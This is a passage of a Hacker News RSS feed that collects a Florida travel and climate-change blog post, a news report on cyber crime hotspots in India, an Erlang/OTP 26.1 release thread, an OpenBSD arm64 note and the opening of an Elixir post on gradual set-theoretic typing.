<p>Let’s start with plastic. Everything seems to be made of plastic, wrapped in plastic or both. This is a hotel breakfast for the 3 of us. That is a serious amount of plastic. </p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg"><img data-attachment-id="11185" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1572-1/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg" data-orig-size="959,552" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4&quot;,&quot;iso&quot;:&quot;40&quot;,&quot;shutter_speed&quot;:&quot;0.0083333333333333&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1572-1" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=959" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg 959w, https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=768 768w" sizes="(max-width: 959px) 100vw, 959px"></a></figure>



<p>Plastic cutlery is the order of the day. And even the plastic cutlery is individually wrapped in plastic! The very cheapest hotels in the UK give you metal cutlery.</p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg"><img data-attachment-id="11187" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1569/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg" data-orig-size="1000,736" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1691915877&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.0026109660574413&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1569" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=1000" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg 1000w, https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=768 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a></figure>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg"><img data-attachment-id="11186" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1573/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg" data-orig-size="750,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1691999126&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.0073529411764706&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1573" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=225" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=750" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg 750w, https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=113 113w, https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=225 225w" sizes="(max-width: 750px) 100vw, 750px"></a></figure>



<p>Apples were individually wrapped in plastic. </p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg"><img data-attachment-id="11188" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1578/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg" data-orig-size="750,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1691999172&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;25&quot;,&quot;shutter_speed&quot;:&quot;0.016949152542373&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1578" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=225" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=750" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg 750w, https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=113 113w, https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=225 225w" sizes="(max-width: 750px) 100vw, 750px"></a></figure>



<p>We even saw oranges wrapped in plastic. Nature already provided oranges with their own wrapper! I don’t remember the plastic issue being as bad when I travelled through Wyoming, Utah and Colorado in 1999. Maybe it’s a hangover from COVID?</p>



<p>And then there are the cars. We did a quick informal survey and over half the vehicles on the road were massive SUVs and even more massive pickup trucks, with macho names like ‘Raptor’ and ‘Titan’. The very low tax on petrol/gas (by European standards) makes this possible. These pickup trucks are clearly being used mostly by people from the suburbs who do not need a huge pickup truck. We hired a ‘mid-size’ (but big by European standards) SUV ourselves as, in a previous trip, we had found it quite intimidating to drive a European sized saloon car on American roads. </p>



<p>The front of these pick-up trucks is so high that a pedestrian hit by one is definitely going under, rather than over. Especially the ridiculous ‘raised’ pickup trucks, which are very common.</p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg"><img data-attachment-id="11190" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_3534/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg" data-orig-size="2933,2336" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone SE (2nd generation)&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.0027932960893855&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_3534" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=1024" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=1024 1024w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=2048 2048w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>



<p>Not that there are many pedestrians in Florida, of course. You are expected to have a car and drive everywhere. You can even eat your breakfast in your car.</p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg"><img data-attachment-id="11192" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/dsc_0639/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg" data-orig-size="1000,526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;5&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;NIKON D7000&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;32&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.01&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dsc_0639" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=1000" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg 1000w, https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=768 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a><figcaption>The breakfast drive-thru queue at Fort Myers Dunkin Donuts.</figcaption></figure>



<p>The provision of pavements/sidewalks is decidely lacking and public transport is pretty much non-existent. If you are too poor to own a car, hard luck. There did seem to be some cycle lanes, but they ran along major roads and weren’t segregated from all the enormous vehicles. They looked utterly terrifying. No wonder no-one was using them. Perhaps cyclists had tried, but they had all been run over.</p>



<p>Everywhere has air con and it all seems to run 24×7. Often with doors left open. When you turn up to your hotel/motel room, the air con is running and it doesn’t turn off when you take your card out of the slot to leave the room. It has probably been running in every room since the hotel was built, regardless of whether the rooms are occupied or not. Heaven forbid that you should have to wait 2 minutes for the air con to cool the room down. </p>



<p>This might be ok if the air con was powered by solar. But it isn’t. We hardly saw a solar panel in our whole trip to ‘The Sunshine State’. This is hard to fathom, as there are solar panels everywhere in temperate and cloudy Britain. When we asked one of the locals why she didn’t have solar, she told us that solar power was penalised by the power company, so it wasn’t worth it. We didn’t see a single wind turbine either.</p>



<p>The irony is that Florida is one of the most vulnerable places on earth to climate change. It is already ridiculously hot in the summer. A few more degrees of extra temperature will make it unbearable outside your air conditioned room or vehicle. Higher temperatures means more air con, which means more carbon in the atmosphere, which means even higher temperatures. Florida has a <a href="https://www.statista.com/statistics/1325529/lowest-points-united-states-state/">mean elevation of just 31m/100ft</a> above sea level. The majority of Miami-Dade county is <a href="https://wusfnews.wusf.usf.edu/environment/2023-03-11/miamis-hidden-high-ground-what-sea-rise-risk-means-for-some-prime-real-estate">less than 2m/6ft above sea level</a> (possibly less, depending on when you are reading this). The only thing we saw that looked like a hill in Florida, was in fact a huge landfill. Probably mostly full of single-use plastic cutlery. The rich are already starting to move to higher ground in Miami. Maybe only the landfills will be left above sea level by the end of the century? Florida is also  regularly devastated by hurricanes. The devastation left by 2022 <a href="https://en.wikipedia.org/wiki/Hurricane_Ian">category 5 hurricane Ian</a> is still very obvious and <a href="https://en.wikipedia.org/wiki/Hurricane_Idalia">category 4 hurricane Idalia</a> hit a few days after we left. Rising sea temperatures can only lead to more devastating hurricanes. </p>



<p>And Florida isn’t even one of the worst offenders, placing 39th out of the 50 US states with around <a href="https://solarpower.guide/solar-energy-insights/states-ranked-carbon-dioxide-emissions">10.8 metric tons of CO2 per capita per year</a>. In part due to the lack of any heavy industry. The worst offending state in the USA is Wyoming with a whopping 104.5  metric tons of CO2 per capita per year. Across the country Americans average <a href="https://www.worldometers.info/co2-emissions/co2-emissions-per-capita/">15.3 tons per capita per year</a>, compared to 5.6 tons for the UK. And the USA isn’t even the worst offender. Qatar clocks in at 38.1 tons per capita per year.</p>



<p>Climate change is not some minor inconvenience where we lose a few obscure species of frogs and have to wear a bit more sunscreen. We could be talking about widescale crop failures and extreme weather events making large parts of the globe unliveable. Leading to famine and migration on a scale way beyond anything we have seen so far. Given the seriousness of the situation it is depressing to see such profligate waste. My fear is that other people will look at places like Florida and think “why am I even trying to do the right thing? Look at them!” and not even try.</p>



<p>We are in trouble. The current system of sovereign states with politicians driven by short-term goals is poorly placed to fix long-term, global problems. And the billionaires are not going to save us. They are the main beneficiaries of the current system and they are going to use their money and power to keep it that way. If we let them. Geo-engineering is hugely risky. Carbon sequestration looks unlikely to make any meaningful difference. Moving to Mars is a pipedream for 99.9999% of the population. This is the only planet in the universe we have evolved to live on. We are stuck here with the mess we have created in a slow motion <a href="https://en.wikipedia.org/wiki/Tragedy_of_the_commons">tragedy of the commons.</a> Individual choice is not going to cut it. We need deep structural change. Much higher taxes on fossil fuels and less enormous pickup trucks for a start. We need to get our act together, and soon. For ourselves and our children. But, having seen the situation in Florida, I don’t hold out much hope.</p>
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[India's biggest tech centers named as cyber crime hotspots (172 pts)]]></title>
            <link>https://www.theregister.com/2023/09/21/india_cybercrime_trends_report/</link>
            <guid>37594855</guid>
            <pubDate>Thu, 21 Sep 2023 08:39:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2023/09/21/india_cybercrime_trends_report/">https://www.theregister.com/2023/09/21/india_cybercrime_trends_report/</a>, See on <a href="https://news.ycombinator.com/item?id=37594855">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>India is grappling with a three-and-a-half year surge in cyber crime, with analysis suggesting cities like Bengaluru and Gurgaon – centers of India's tech development – are also hubs of evil activity.</p>
<p>The report – <i>A Deep Dive into Cybercrime Trends Impacting India</i> from the non-profit Future Crime Research Foundation (FCRF) – identified cyber crime hot spots, as well as the most popular types of infosec assaults, from January 2020 until June 2023.</p>
<p>"The analysis of the top 10 cyber crime-prone districts in India reveals several common factors contributing to their vulnerability. These include geographical proximity to major urban centers, limited cyber security infrastructure, socioeconomic challenges, and low digital literacy," <a target="_blank" href="https://www.futurecrime.org/cyber-crime-research">states</a> the report.</p>

    

<p>Several of the most cyber crime-prone top geographies house tech hubs. Gurgaon and Bangalore – both <a target="_blank" href="https://hightech.cbrevancouver.com/wp-content/uploads/2019/05/Asia-Pacific-Major-Report_Programming-Asia-Pacific-Tech-Cities-as-Global-Tech-Hubs_April-2019.pdf">considered</a> [PDF] among the top five most attractive cities for the IT industry in Asia – featured for the wrong reasons.</p>

        


        

<p>The Gurgaon district, which is home to a planned IT-focused city of the same name, made number six on FCRF's list. The district accounted for 8.1 percent of reported cyber crime, despite being home to less than 0.2 percent of India's population.</p>
<p>FCRF cited the high crime rate as "likely influenced by its status as a major corporate and IT hub, making it an attractive target for cyber criminals seeking valuable data or financial gains."</p>

        

<p>Outsourcing services and call centers are prominent in the area. Globally recognised tech names including Google, Microsoft, IBM India, Accenture, Cognizant, Infosys, Wipro and more all have presence in the city.</p>
<p>And while the city is known for economic affluence – it's <a target="_blank" href="https://www.gmda.gov.in/aboutus/metropolitan-area.html?language=en">said</a> to have the third highest per capita income in India – the Foundation suggested "disparities in digital literacy and cyber security awareness" could be factors likely to drive criminal activity.</p>
<ul>

<li><a href="https://www.theregister.com/2023/03/27/indian_cybergang_busted_for_selling/">India-based cybergang busted for selling fake KFC franchises</a></li>

<li><a href="https://www.theregister.com/2023/07/06/hpe_india_server_manufacturing/">HPE prepares for spicy affair with India to churn out $1B worth of servers</a></li>

<li><a href="https://www.theregister.com/2022/11/01/india_lending_app_crackdown_ordered/">India's Home Ministry cracks down on predatory lending apps following suicides</a></li>

<li><a href="https://www.theregister.com/2023/09/05/qualys_top_20_vulnerabilities/">You patched yet? Years-old Microsoft security holes still hot targets for cyber-crooks</a></li>
</ul>
<p>Meanwhile, Bangalore – in the district of Karnataka – was named by FCRF as an emerging cyber crime hotspot. The city is known as the "Silicon Valley of India" thanks to its proliferation of IT employers – including Infosys, Wipro, Tata Consultancy Services, IBM India, Microsoft, Google, Amazon Intel, Cisco, Samsung Research Institute, Nvidia Graphics and more.</p>
<p>Topping the list was Gurgaon's neighbor Bharatpur, with 18 percent of India's overall cyber crime. FCRF cites limited employment opportunities and lack of digital literacy as reasons for the region's prevalence of crime, as well as the fact it contains major urban centers like Delhi and Jaipur.</p>
<p>Mathura – a district filled with significant religious sites – took second place with 12 percent. The FCRF cited limited cyber security infrastructure and the area's status as a tourist attraction among likely reasons it was so popular with crims.</p>

        

<p>Another finding in the report was that of all reported cyber crimes in India, almost half (47.25 percent) involved Unified Payments Interface (UPI) fraud. Debit, credit card and sim swap fraud came in a distant second place with 11.27 percent. Overall, financially motivated crime accounted for 77.41 percent of incidents. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Erlang/OTP 26.1 Released (203 pts)]]></title>
            <link>https://erlangforums.com/t/erlang-otp-26-1-released/2886</link>
            <guid>37594525</guid>
            <pubDate>Thu, 21 Sep 2023 07:56:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://erlangforums.com/t/erlang-otp-26-1-released/2886">https://erlangforums.com/t/erlang-otp-26-1-released/2886</a>, See on <a href="https://news.ycombinator.com/item?id=37594525">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post_1">
            <div>
              


              <p><span>
                  <time itemprop="datePublished" datetime="2023-09-21T07:08:50Z">
                    September 21, 2023,  7:08am
                  </time>
                  <meta itemprop="dateModified" content="2023-09-21T07:08:50Z">
              <span itemprop="position">1</span>
              </span>
            </p></div>
            <div itemprop="articleBody">
              <h2><a name="otp-261-httpswwwerlangorgnews165otp-261-1" href="#otp-261-httpswwwerlangorgnews165otp-261-1"></a>OTP 26.1 <a href="https://www.erlang.org/news/165#otp-261">#</a></h2>
<p>Erlang/OTP 26.1 is the first maintenance patch package for OTP 26, with mostly bug fixes as well as improvements.</p>
<p>For details about bugfixes and potential incompatibilities see the <a href="https://erlang.org/download/otp_src_25.1.readme">Erlang 26.1 README</a></p>
<p>The Erlang/OTP source can also be found at GitHub on the official Erlang repository, <a href="https://github.com/erlang/otp">GitHub - erlang/otp: Erlang/OTP</a></p>
<p>Download links for this and previous versions are found here</p>
<ul>
<li><a href="https://www.erlang.org/downloads">Downloads - Erlang/OTP</a></li>
</ul>
            </div>

            

            

          </div><div itemprop="comment" id="post_2" itemscope="" itemtype="http://schema.org/Comment">
              <p>Just a heads up, you linked to the Erlang <strong>25</strong>.1 README instead of <strong>26</strong>.1.</p>
<p>Great job to everyone involved with this release!</p>
            </div><div id="post_3" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <div>
              <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://erlangforums.com/u/nzok"><span itemprop="name">nzok</span></a>
                
              </span></p>


              <p><span>
                  <time itemprop="datePublished" datetime="2023-09-21T11:46:40Z">
                    September 21, 2023, 11:46am
                  </time>
                  <meta itemprop="dateModified" content="2023-09-21T11:46:40Z">
              <span itemprop="position">3</span>
              </span>
            </p></div>
            <div itemprop="text">
              <p>Speaking of releases,</p>
<p>% sudo apt update<br>
…<br>
Err:18 <a href="http://binaries.erlang-solutions.com/debian" rel="noopener nofollow ugc">http://binaries.erlang-solutions.com/debian</a> jammy Release<br>
404 Not Found [IP: 13.33.21.93 80]<br>
…<br>
E: The repository ‘<a href="http://binaries.erlang-solutions.com/debian" rel="noopener nofollow ugc">http://binaries.erlang-solutions.com/debian</a> jammy Release’ does not have a Release file.</p>
<p>What do I do about this, especially to get an updated Erlang?</p>
            </div>

            

            

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Philips Hue will soon force users to create an account (143 pts)]]></title>
            <link>https://defcon.social/@mysk/111097362983335713</link>
            <guid>37594377</guid>
            <pubDate>Thu, 21 Sep 2023 07:38:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://defcon.social/@mysk/111097362983335713">https://defcon.social/@mysk/111097362983335713</a>, See on <a href="https://news.ycombinator.com/item?id=37594377">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[OpenBSD/ARM64 on Hetzner Cloud (200 pts)]]></title>
            <link>https://www.undeadly.org/cgi?action=article;sid=20230921073556</link>
            <guid>37594365</guid>
            <pubDate>Thu, 21 Sep 2023 07:36:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.undeadly.org/cgi?action=article;sid=20230921073556">https://www.undeadly.org/cgi?action=article;sid=20230921073556</a>, See on <a href="https://news.ycombinator.com/item?id=37594365">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Contributed by
<a href="https://undeadly.org/">Paul 'WEiRD' de Weerd</a>
on <time datetime="2023-09-21T07:20:10Z">2023-09-21</time>
from the ARMing Puffy for the cloud dept.</p>
<p>Frederic Cambus (<code>fcambus@</code>) wrote a blogpost about running OpenBSD on the arm64-based cloudservers provided by Hetzner. For now, only -current will work,
because the new <a href="https://man.openbsd.org/viogpu.4"><code>viogpu(4)</code></a>
driver
[on which we
<a href="https://www.undeadly.org/cgi?action=article;sid=20230421124221">reported earlier</a>]
is needed.</p>

<p>Head on over to <a href="https://www.cambus.net/openbsd-arm64-on-hetzner-cloud/">Frederic's blog</a> for the full story!</p>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Strong arrows: a new approach to gradual typing (158 pts)]]></title>
            <link>https://elixir-lang.org/blog/2023/09/20/strong-arrows-gradual-typing/</link>
            <guid>37593967</guid>
            <pubDate>Thu, 21 Sep 2023 06:39:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://elixir-lang.org/blog/2023/09/20/strong-arrows-gradual-typing/">https://elixir-lang.org/blog/2023/09/20/strong-arrows-gradual-typing/</a>, See on <a href="https://news.ycombinator.com/item?id=37593967">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
        <p><em>This is article expands on the topic of gradual set-theoretic typing discussed during my keynote at <a href="https://www.youtube.com/watch?v=giYbq4HmfGA">ElixirConf US 2023</a>.</em></p>

<p>There is an on-going effort <a href="https://elixir-lang.org/blog/2023/06/22/type-system-updates-research-dev/">to research and develop a type system for Elixir</a>, lead by <a href="https://www.irif.fr/~gc/">Giuseppe Castagna</a>, CNRS Senior Researcher, and taken by <a href="https://www.irif.fr/users/gduboc/index">Guillaume Duboc</a> as part of his PhD studies.</p>

<p>In this article, we will discuss how the proposed type system will tackle gradual typing and how it relates to set-theoretic types, with the goal of providing an introduction to the ideas <a href="https://arxiv.org/abs/2306.06391">presented in our paper</a>.</p>

<h2 id="set-theoretic-types">Set-theoretic types</h2>

<p>The type system we are currently researching and developing for Elixir is based on set-theoretic types, which is to say its operations are based on the fundamental set operations of union, intersection, and negation.</p>

<p>For example, the atom <code>:ok</code> is a value in Elixir, that can be represented by the type <code>:ok</code>. All atoms in Elixir as represented by themselves in the type system. A function that returns either <code>:ok</code> or <code>:error</code> is said to return <code>:ok or :error</code>, where the <code>or</code> operator represents the union.</p>

<p>The types <code>:ok</code> and <code>:error</code> are contained by the type <code>atom()</code>, which is an infinite set representing all atoms. The union of the types <code>:ok</code> and <code>atom()</code> can be written as <code>:ok or atom()</code>, and is equivalent to <code>atom()</code> (as <code>:ok</code> is a subset of <code>atom()</code>). The intersection of the types <code>:ok</code> and <code>atom()</code> can be written as <code>:ok and atom()</code>, and is equivalent to <code>:ok</code>.</p>

<p>Similarly, <code>integer()</code> is another infinite set representing all integers. <code>integer() or atom()</code> is the union of all integers and atoms. The intersection <code>integer() and atom()</code> is an empty set, which we call <code>none()</code>. The union of all types that exist in Elixir is called <code>term()</code>.</p>

<p>The beauty of set-theoretic types is that we can model many interesting properties found in Elixir programs on top of those fundamental set operations, which in turn we hope to make typing in Elixir both more expressive and accessible. Let’s see an example of how a type system feature, called bounded quantification (or bounded polymorphism), can be implemented with set-theoretic types.</p>

<h2 id="upper-and-lower-bounds">Upper and lower bounds</h2>

<p>The <code>identity</code> function is a function that receives an argument and returns it as is. In Java, it would be written as follows:</p>

<div><pre><code><span>static</span> <span>&lt;</span><span>T</span><span>&gt;</span> <span>T</span> <span>identity</span><span>(</span><span>T</span> <span>arg</span><span>)</span> <span>{</span>
    <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>In TypeScript:</p>

<div><pre><code><span>function</span> <span>identity</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>):</span> <span>T</span> <span>{</span>
  <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Or in Haskell:</p>

<div><pre><code><span>id</span> <span>::</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>id</span> <span>arg</span> <span>=</span> <span>arg</span>
</code></pre></div>

<p>In all of the examples above, we say the function receives an argument of type variable <code>T</code> (or type variable <code>a</code> in Haskell’s case) and return a value of the same type <code>T</code>. We call this parametric polymorphism, because the function parameter - its argument - can take many (poly) shapes (morphs). In Elixir, we could then support:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>Sometimes we may want to further constrain those type variables. As example, let’s constraint the identity function in Java to numbers:</p>

<div><pre><code><span>static</span> <span>&lt;</span><span>T</span> <span>extends</span> <span>Number</span><span>&gt;</span> <span>T</span> <span>identity</span><span>(</span><span>T</span> <span>arg</span><span>)</span> <span>{</span>
    <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Or in TypeScript:</p>

<div><pre><code><span>function</span> <span>identity</span><span>&lt;</span><span>T</span> <span>extends</span> <span>number</span><span>&gt;</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>):</span> <span>T</span> <span>{</span>
    <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>In Haskell, we can constrain to a typeclass, such as <code>Ord</code>:</p>

<div><pre><code><span>id</span> <span>::</span> <span>Ord</span> <span>a</span> <span>=&gt;</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>id</span> <span>x</span> <span>=</span> <span>x</span>
</code></pre></div>

<p>In order words, these functions can accept any type as long as they fullfil a given constraint. This in turn is called bounded polymorphism, because we are putting bounds on the types we can receive.</p>

<p>With all that said, how can we implement bounded polymorphism in set-theoretic types? Imagine we have a type variable <code>a</code>, how can we ensure it is bounded or constrained to another type?</p>

<p>With set-theoretic types, this operation is an intersection. If you have <code>a and atom()</code>, <code>a</code> can be the type <code>:foo</code>. <code>a</code> can also be the type <code>atom()</code>, which represents all atom types, but <code>a</code> cannot be <code>integer()</code>, as <code>integer() and atom()</code> will return an empty set. In other words, there is no need to introduce a new semantic construct, as intersections can be used to place upper bounds in type variables! Therefore, we could restrict Elixir’s identity function to numbers like this:</p>

<div><pre><code><span>$</span> <span>a</span> <span>and</span> <span>number</span><span>()</span> <span>-&gt;</span> <span>a</span> <span>and</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>Or course, we can provide syntax sugar for those constraints:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>But at the end of the day it will simply expand to intersections. The important bit is that, at the semantic level, there is no need for additional constructs and representations.</p>

<blockquote>
  <p>Note: for the type-curious readers, set-theoretic types implement <a href="http://lucacardelli.name/Papers/OnUnderstanding.pdf">a limited form of bounded quantification <em>à la</em> Kernel Fun</a>. In a nutshell, it means we can only compare functions if they have the same bounds. For example, our type system states <code>a -&gt; a when a: integer() or boolean()</code> is not a subtype of <code>a -&gt; a when a: integer()</code>.</p>
</blockquote>

<p>We also get lower bounds for free. If intersections allow us to place an upper bound on a type variable, a union is equivalent to a lower bound as it specifies the type variable will always be augmented by the union-ed type. For example, <code>a or atom()</code> says the result will always include atoms plus whatever else specified by <code>a</code> (which may be an atom, <code>atom()</code> itself, or a completely disjoint type such as <code>integer()</code>).</p>

<p>Elixir protocols, which is an Elixir construct equivalent to Haskell Typeclasses or Java interfaces, is another example of functionality that can be modelled and composed with set-theoretic types without additional semantics. The exact mechanism to do so is left as an exercise to the reader (or the topic of a future blog post).</p>

<h2 id="enter-gradual-typing">Enter gradual typing</h2>

<p>Elixir is a functional dynamic programming language. Existing Elixir programs are untyped, which means that a type system needs mechanisms to interface existing Elixir code with future statically typed Elixir code. We can achieve this with gradual typing.</p>

